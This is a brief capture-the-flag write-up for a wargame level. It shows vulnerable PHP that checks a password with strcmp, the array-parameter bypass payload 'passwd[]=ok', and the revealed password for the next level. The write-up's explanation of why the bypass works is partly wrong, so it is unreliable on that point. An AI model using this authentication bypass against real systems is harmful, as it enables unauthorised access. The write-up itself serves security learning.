# Solution
The source reveals that it will find a param name `passwd` to perform password validation:
```php
<?php    if(array_key_exists("passwd",$_REQUEST)){  
        if(!strcmp($_REQUEST["passwd"],"<censored>")){  
            echo "<br>The credentials for the next level are:<br>";  
            echo "<pre>Username: natas25 Password: <censored></pre>";  
        }  
        else{  
            echo "<br>Wrong!<br>";  
        }  
    }    // morla / 10111  
?>
```

The thing about `strcmp` is that it will return 0 if the two compared values are the same, including null. If we don't supply `passwd`, we will achieve the `null` value.
```
passwd[]=ok
```

```
ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
```